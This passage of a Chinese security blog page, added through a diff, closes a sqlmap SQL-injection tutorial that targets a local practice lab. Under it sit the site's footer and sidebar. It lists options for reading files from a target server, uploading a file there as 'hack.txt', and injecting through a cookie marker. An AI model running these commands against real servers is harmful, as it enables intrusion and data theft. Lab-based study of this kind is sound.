+--data=&#34;uname=admin&amp;passwd=admin&amp;submit=Submit&#34;  #抓取其post提交的数据填入
+--file-read &#34;c:/test.txt&#34; #读取目标服务器C盘下的test.txt文件
+--file-write  test.txt  --file-dest &#34;e:/hack.txt&#34;  #将本地的test.txt文件上传到目标服务器的E盘下，并且名字为hack.txt
+--proxy=&#34;http://127.0.0.1:8080&#34;    #指定代理
+--prefix=PREFIX     #注入payload字符串前缀
+--suffix=SUFFIX     #注入payload字符串后缀
+</code></pre></div><p>使用星号（*）来指定注入点</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">python sqlmap.py -u &#34;http://127.0.0.1/Less-20/?id=1&#34; --cookie=&#34;uname=admin*&#34; --banner
+</code></pre></div><p>提示：<code>custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q]</code></p>
+<p>更多更全的命令可以参考下面博客：</p>
+<p><a class="link" href="https://www.freebuf.com/sectool/164608.html"  target="_blank" rel="noopener"
+    >https://www.freebuf.com/sectool/164608.html</a></p>
+<p>或者官方文档……</p>
+<p>ps：感觉根据实际环境来修改现有的工具进行利用才是最nice的！</p>
+<p>参考：</p>
+<p><a class="link" href="https://blog.csdn.net/whatday/article/details/62059263"  target="_blank" rel="noopener"
+    >https://blog.csdn.net/whatday/article/details/62059263</a></p>
+<p><a class="link" href="https://www.anquanke.com/post/id/235846"  target="_blank" rel="noopener"
+    >https://www.anquanke.com/post/id/235846</a></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/sql%E6%B3%A8%E5%85%A5/">SQL注入</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">Related contents</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="">
+    <a href="/2022/lnmp%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E6%88%90%E5%8A%9F%E7%AF%87/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">LNMP环境搭建成功篇</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/2022/lnmp%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%B1%E8%B4%A5%E7%AF%87/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">LNMP环境搭建失败篇</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/2022/%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E7%BB%8F%E5%8E%86/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">第一次面试经历</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+     
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (DISQUS) {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+  
+
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+
+<script>
+(function(u, c) {
+  var d = document, t = 'script', o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+  o.src = u;
+  if (c) { o.addEventListener('load', function(e) { c(e); }); }
+  s.parentNode.insertBefore(o, s);
+})('//cdn.bootcss.com/pangu/3.3.0/pangu.min.js', function() {
+  pangu.spacingPage();
+});
+</script>
+
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2022 <a href="https://stack-theme-mod.vercel.app/">Example Site</a>·<i class="fas fa-bell"></i> <a id="days">0</a>Days<br>
+      共书写了26.8k字·共 18篇文章</br><span><p>
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.2.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a><br />
+         <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">© Licensed Under CC BY-NC-SA 4.0</a>
+    </section>
+
+<script>
+var s1 = '2022-02-12';
+s1 = new Date(s1.replace(/-/g, "/"));
+s2 = new Date();
+var days = s2.getTime() - s1.getTime();
+var number_of_days = parseInt(days / (1000 * 60 * 60 * 24));
+document.getElementById('days').innerHTML = number_of_days;
+</script>
+    
+</footer>
+
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+    
+    
+    <aside class="sidebar right-sidebar sticky">
+        
+            <form action="/search/" class="search-form widget" >
+        <p>
+            <label>Search</label>
+            <input name="keyword" required placeholder="Type something..." />
+        
+            <button title="Search">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+            </button>
+        </p>
+    </form>
+        
+            
+        
+            <section class="widget categories">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-infinity" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M9.828 9.172a4 4 0 1 0 0 5.656 a10 10 0 0 0 2.172 -2.828a10 10 0 0 1 2.172 -2.828 a4 4 0 1 1 0 5.656a10 10 0 0 1 -2.172 -2.828a10 10 0 0 0 -2.172 -2.828" />
+</svg>
+
+
+  
+        </div> 
+        <h2 class="widget-title section-title">Categories</h2>
+    <div class="widget-categories--list">
+<div class="widget">
+    <h3 class="widget-title"> </h3>
+    <div class="widget-body">
+        <div class="category-list">
+            <div class="category-list-item"><a href="https://proben1.github.io/categories/%E5%B0%8F%E4%BA%BA%E8%81%94%E5%90%88%E5%B7%A5%E4%BC%9A/" class="category-list-link">小人联合工会<span class="category-list-count">1</a>
+            </span></div>
+            <div class="category-list-item"><a href="https://proben1.github.io/categories/%E6%95%B4%E7%82%B9%E5%B0%8F%E6%B4%BB/" class="category-list-link">整点小活<span class="category-list-count">6</a>
+            </span></div>
+            <div class="category-list-item"><a href="https://proben1.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="category-list-link">网络安全<span class="category-list-count">11</a>
+            </span></div>
+        </div>
+    </div>
+</div>
+    </div>
+    </section>
+        
+            <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-infinity" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M9.828 9.172a4 4 0 1 0 0 5.656 a10 10 0 0 0 2.172 -2.828a10 10 0 0 1 2.172 -2.828 a4 4 0 1 1 0 5.656a10 10 0 0 1 -2.172 -2.828a10 10 0 0 0 -2.172 -2.828" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Archives</h2>
+
+        
+        
+        
+        
+        
+        <div class="widget-archive--list">
+            <div class="archives-year">
+                    <a href="/archives/#2022">
+                        
+                            <span class="year">2022</span>
+                            <span class="count">9</span>
+                        
+                    </a> 
+                </div>
+            <div class="archives-year">
+                    <a href="/archives/#2021">
+                        
+                            <span class="year">2021</span>
+                            <span class="count">9</span>
+                        
+                    </a> 
+                </div>
+            
+        </div>
+    </section>
+        
+            <section class="widget tagCloud">
+    <div class="widget-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-tag" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11 3L20 12a1.5 1.5 0 0 1 0 2L14 20a1.5 1.5 0 0 1 -2 0L3 11v-4a4 4 0 0 1 4 -4h4" />
+  <circle cx="9" cy="9" r="2" />
+</svg>
+
+
+
+    </div>
+    <h2 class="widget-title section-title">Tags</h2>
+
+    <div class="tagCloud-tags">
+        
+            <a href="/tags/sql%E6%B3%A8%E5%85%A5/" class="font_size_3">
+                SQL注入
+            </a>
+        
+            <a href="/tags/python/" class="font_size_2">
+                python
+            </a>
+        
+            <a href="/tags/docker/" class="font_size_1">
+                Docker
+            </a>
+        
+            <a href="/tags/git/" class="font_size_1">
+                git
+            </a>
+        
+            <a href="/tags/js/" class="font_size_1">
+                js
+            </a>
+        
+            <a href="/tags/sql/" class="font_size_1">
+                SQL
+            </a>
+        
+            <a href="/tags/thinkphp/" class="font_size_1">
+                thinkphp
+            </a>
+        
+            <a href="/tags/windows/" class="font_size_1">
+                Windows
+            </a>
+        
+            <a href="/tags/xss/" class="font_size_1">
+                xss
+            </a>
+        
+            <a href="/tags/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/" class="font_size_1">
+                二次注入
+            </a>
+        
+    </div>
+</section>
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
